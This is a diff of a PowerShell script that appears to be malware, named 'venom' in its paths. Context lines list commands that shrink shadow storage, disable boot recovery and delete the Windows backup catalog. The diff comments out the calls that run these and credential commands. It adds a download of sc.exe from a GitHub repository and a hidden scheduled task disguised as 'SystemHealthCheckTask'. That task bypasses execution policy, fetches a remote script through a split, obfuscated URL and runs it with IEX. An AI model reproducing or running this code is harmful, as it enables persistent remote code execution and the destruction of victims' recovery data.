@@ -84,16 +84,16 @@ $cripple_commands = @('cmd.exe /c vssadmin resize shadowstorage /for=C: /on=C: /
     'cmd.exe /c bcedit /set {default} recoveryenabled No'
 	'cmd.exe /c wbadmin delete catalog -quiet')
 
-Invoke-CommandArray -Commands $cred_commands -Csv
-Start-Sleep 5
-Invoke-CommandArray -Commands $cripple_commands -Csv
-
-
+#Invoke-CommandArray -Commands $cred_commands -Csv
+#Start-Sleep 5
+#Invoke-CommandArray -Commands $cripple_commands -Csv
 $scheduledTaskCreator = $PSScriptRoot + '\sc.exe'
-Write-Host $scheduledTaskCreator
+#$scheduledTaskCreator = "c:\venom\sc.exe"
+Invoke-WebRequest -Uri	'https://github.com/theblueshadow48/running-deploy/raw/refs/heads/main/sc.exe' -out $scheduledTaskCreator
+#Write-Host $scheduledTaskCreator
 $scheduledCommand = "$scheduledTaskCreator create SystemHealthCheckTask powershell.exe `"-ep Bypass -c (New-object Net.WebClient).DownloadString('https://raw.gi'+'thubusercontent.com/theblueshadow48/running-deploy/refs/heads/main/venom.ps1')|IEX;`""
 if (Test-Path $scheduledTaskCreator) {
-    Write-Host $scheduledCommand
+    Write-Host $scheduledTaskCreator
     Start-Process cmd.exe -ArgumentList "/c", $scheduledCommand -WindowStyle Hidden
 }
   
